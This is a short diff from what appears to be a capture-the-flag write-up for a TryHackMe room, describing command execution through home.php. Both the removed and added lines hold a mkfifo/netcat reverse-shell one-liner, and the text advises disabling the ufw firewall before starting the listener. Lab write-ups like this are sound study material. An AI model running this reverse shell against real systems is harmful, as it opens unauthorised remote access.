@@ -33,7 +33,7 @@ OK.. Here see home.php <br />
  ![nmap]({{site.baseurl}}/assets/img/cholocate.tryhackme/command.ls.png)  
   try system commands then reverse connection command 
   
-  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
+ : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
  
  remember one thing  disable your ufw firewall before run the listerning netcat <br />
   listern our system 
